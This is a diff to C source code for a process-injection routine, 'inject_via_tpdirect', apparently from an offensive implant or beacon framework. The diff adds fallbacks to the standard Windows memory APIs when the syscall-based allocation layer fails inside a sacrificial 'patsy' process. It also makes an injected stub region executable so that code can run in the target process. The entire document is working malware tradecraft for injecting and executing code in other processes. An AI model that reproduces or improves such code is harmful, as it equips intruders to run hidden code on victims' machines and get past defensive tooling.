@@ -659,8 +659,15 @@ BOOL inject_via_tpdirect(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID 
 	unsigned char * stub = (unsigned char *)beacon_VirtualAllocEx(hProcess, NULL, 0x1000,
 	                                                                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	if (stub == NULL) {
-		spawn_log("tpdirect: stub alloc failed gle=", (long)GetLastError());
-		return FALSE;
+		/* C-25 live: the randomized-base syscall alloc layer rejects these
+		 * requests inside the patsy (gle=183) - fall back to the plain API */
+		spawn_log("tpdirect: stub syscall alloc failed, api fallback gle=", (long)GetLastError());
+		stub = (unsigned char *)VirtualAllocEx(hProcess, NULL, 0x1000,
+		                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+		if (stub == NULL) {
+			spawn_log("tpdirect: stub alloc failed gle=", (long)GetLastError());
+			return FALSE;
+		}
 	}
 	SIZE_T sgot = 0;
 	if (!beacon_WriteProcessMemory(hProcess, stub, stubc, sizeof(stubc), &sgot) || sgot != sizeof(stubc)) {
@@ -669,7 +676,8 @@ BOOL inject_via_tpdirect(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID 
 	}
 	{
 		DWORD sold = 0;
-		if (!beacon_VirtualProtectEx(hProcess, stub, sizeof(stubc), PAGE_EXECUTE_READ, &sold)) {
+		if (!beacon_VirtualProtectEx(hProcess, stub, 0x1000, PAGE_EXECUTE_READ, &sold)
+				&& !VirtualProtectEx(hProcess, stub, 0x1000, PAGE_EXECUTE_READ, &sold)) {
 			spawn_log("tpdirect: stub protect failed gle=", (long)GetLastError());
 			return FALSE;
 		}
@@ -677,8 +685,12 @@ BOOL inject_via_tpdirect(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID 
 	unsigned char * direct = (unsigned char *)beacon_VirtualAllocEx(hProcess, NULL, 0x60,
 	                                                                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	if (direct == NULL) {
-		spawn_log("tpdirect: direct alloc failed gle=", (long)GetLastError());
-		return FALSE;
+		direct = (unsigned char *)VirtualAllocEx(hProcess, NULL, 0x60,
+		                                         MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+		if (direct == NULL) {
+			spawn_log("tpdirect: direct alloc failed gle=", (long)GetLastError());
+			return FALSE;
+		}
 	}
 	{
 		unsigned char buf[0x60];
